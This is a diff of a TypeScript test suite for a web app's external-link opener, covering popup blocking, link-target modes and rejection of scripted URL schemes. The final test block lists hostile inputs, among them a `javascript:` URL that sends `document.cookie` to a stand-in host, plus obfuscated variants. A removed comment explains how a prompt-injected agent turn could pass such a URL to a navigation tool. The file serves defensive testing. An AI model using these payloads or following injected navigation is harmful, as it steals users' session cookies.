@@ -1,23 +1,15 @@
 import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
 
-// isIOSPwa is cached at module load from the real user-agent, so the branch has
-// to be driven through a mock rather than by faking navigator.
 const platformMocks = vi.hoisted(() => ({ isIOSPwa: false }));
 vi.mock('./platform', () => ({
   isIOSPwa: () => platformMocks.isIOSPwa,
 }));
 
-// Stubbed rather than driven through the real `preferences` signal so the mode
-// matrix below can't be perturbed by store state, and so the "still loading"
-// default is exercised by its own case in the preferences suite.
 const prefMocks = vi.hoisted(() => ({ target: 'safari' as 'safari' | 'ask' | 'in-app' }));
 vi.mock('../store/actions/preferences', () => ({
   currentExternalLinkTarget: () => prefMocks.target,
 }));
 
-// The blocked-popup recovery surfaces through the store's toast + the engine-log
-// breadcrumb channel. Both are stubbed so the assertions read the calls directly
-// and neither the real signal store nor a real fetch is pulled into this suite.
 const toastMocks = vi.hoisted(() => ({ showToast: vi.fn(), dismissToast: vi.fn() }));
 vi.mock('../store/store', () => toastMocks);
 const postClientLog = vi.hoisted(() => vi.fn());
@@ -25,30 +17,20 @@ vi.mock('./clientLog', () => ({ postClientLog }));
 
 const { openExternalUrl } = await import('./openExternalUrl');
 
-// The node test env has neither window.open nor window.location (test-setup.ts
-// aliases window to globalThis), so both are installed as globals.
 const windowOpen = vi.hoisted(() => vi.fn());
 const APP_URL = 'https://app.example.com/ws/dev/';
 let fakeLocation: { href: string };
 
-/** A window handle of the shape a SUCCESSFUL `window.open` hands back. Carries a
- *  writable `opener` because severing it is what replaces the `noopener`
- *  feature, which cannot be passed here: with it set, the spec makes
- *  `window.open` return null on success as well as on a block, so the return
- *  value would carry no signal. */
 function fakeWindow(): { closed: boolean; opener: unknown } {
   return { closed: false, opener: {} };
 }
 
-/** The single toast the blocked path raises, or undefined. */
 function blockedToast(): { message: string; opts: { key: string; action: { label: string; onClick: () => void } } } | undefined {
   const calls = toastMocks.showToast.mock.calls;
   const call = calls.length ? calls[calls.length - 1] : undefined;
   return call ? { message: call[0], opts: call[2] } : undefined;
 }
 
-/** Install a `navigator.share` for this test. The node env has no `navigator.share`,
- *  and `ask` mode's own no-share branch is asserted separately. */
 function stubShare(impl: (data: { url?: string }) => Promise<void>): ReturnType<typeof vi.fn> {
   const share = vi.fn(impl);
   vi.stubGlobal('navigator', { ...navigator, share });
@@ -108,8 +90,6 @@ describe('openExternalUrl', () => {
       openExternalUrl(url);
       expect(windowOpen).toHaveBeenLastCalledWith(url, '_blank');
     }
-    // Pins that each iteration opened, rather than a later one carrying an
-    // earlier call past a silently skipped scheme.
     expect(windowOpen).toHaveBeenCalledTimes(urls.length);
     expect(window.location.href).toBe(APP_URL);
   });
@@ -126,9 +106,6 @@ describe('openExternalUrl', () => {
   it('never passes the `noopener` feature, which would make the return value meaningless', () => {
     openExternalUrl('https://example.com/docs');
 
-    // The spec returns null from window.open whenever `noopener` is set, on a
-    // successful open exactly as on a blocked one, so the feature and the block
-    // detection below cannot coexist. Verified against Chromium and WebKit.
     expect(windowOpen).toHaveBeenCalledWith('https://example.com/docs', '_blank');
     expect(windowOpen.mock.calls[0]).toHaveLength(2);
   });
@@ -223,8 +200,6 @@ describe('openExternalUrl: a popup the browser blocked', () => {
     openExternalUrl(TARGET);
     const toast = blockedToast()!;
 
-    // The retry runs inside a real click, which carries transient user
-    // activation, so the blocker lets this one through.
     windowOpen.mockReturnValue(fakeWindow());
     toast.opts.action.onClick();
 
@@ -274,7 +249,6 @@ describe('openExternalUrl: a popup the browser blocked', () => {
 
     const logged = postClientLog.mock.calls[0][2] as { url: string };
     expect(logged.url.length).toBeLessThan(250);
-    // The button still carries the WHOLE url: only the text was shortened.
     windowOpen.mockReturnValue(fakeWindow());
     blockedToast()!.opts.action.onClick();
     expect(windowOpen).toHaveBeenLastCalledWith(huge, '_blank');
@@ -366,9 +340,6 @@ describe('openExternalUrl: external link target modes', () => {
 
     openExternalUrl(TARGET);
 
-    // Asserted with no `await` between the call and the check: the Web Share
-    // API refuses without transient activation, and a microtask boundary before
-    // share() loses it.
     expect(share).toHaveBeenCalledTimes(1);
   });
 
@@ -437,13 +408,7 @@ describe('openExternalUrl: external link target modes', () => {
   });
 });
 
-// A scripted url reaching `window.open` runs in the workspace's own origin: the
-// new context inherits the opener's. The engine puts no scheme constraint on
-// `navigate_ui`'s url, so a prompt-injected turn picks the value and no user
-// gesture is involved. See `utils/dangerousUrlScheme.ts`.
 describe('openExternalUrl: a scripted scheme is refused, in every mode', () => {
-  // Built rather than written as escapes, so the control character under test
-  // is unambiguous in the source.
   const TAB = String.fromCharCode(9);
   const LF = String.fromCharCode(10);
   const NUL = String.fromCharCode(0);
@@ -452,8 +417,6 @@ describe('openExternalUrl: a scripted scheme is refused, in every mode', () => {
     'javascript:fetch("https://evil.test/"+document.cookie)',
     'JavaScript:alert(1)',
     'vbscript:msgbox(1)',
-    // `new URL(...).href` drops leading C0 controls and interior tabs and
-    // newlines, so the sink sees a bare `javascript:` for each of these.
     ' javascript:alert(1)',
     NUL + 'javascript:alert(1)',
     'java' + TAB + 'script:alert(1)',
